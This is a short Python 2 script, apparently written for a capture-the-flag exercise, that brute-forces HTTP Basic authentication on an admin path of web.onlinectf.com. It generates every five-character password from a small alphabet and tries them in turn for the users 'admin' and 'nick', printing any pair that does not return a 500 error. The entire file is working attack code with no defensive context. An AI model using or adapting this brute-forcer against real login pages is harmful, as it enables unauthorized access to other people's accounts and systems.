#! /usr/bin/python
'''
brute3.py - Attacking simple authentications on a website
authentication is in the form of a POST request with username:password encoded base 64
capture the header from a failed request and insert it as a dictionary into the variable
"headers" with the encoded data going at the appropriate location
 
call until you run out of dictionary or get a 200 response
 
'''
 
import httplib, sys, itertools
 
def gen_passwords(universe,l):
        # use itertools to create a list of all password permutations
        wl = []
        for i in itertools.product(universe,repeat=l):
                wl.append("".join(i))
        return wl
 
def brute2(username):
        if len(sys.argv) < 2:
                wl = gen_passwords("ads",5)
        else:
                wl = [sys.argv[1]]
        for pw in wl:
                str = username+":"+pw
                b64 = "Basic "+str.encode('base64','strict')[:-1]
                headers = { "Authorization": b64, "Content-Length": "0" }
                urlstr = "/johnny/admin"
                conn = httplib.HTTPConnection("web.onlinectf.com")
                conn.request("POST",urlstr,"",headers )
                response = conn.getresponse()
                if response.status != 500:
                        print response.status
                        print "User: "+username+" Password: "+pw
                        return
 
brute2("admin")
brute2("nick")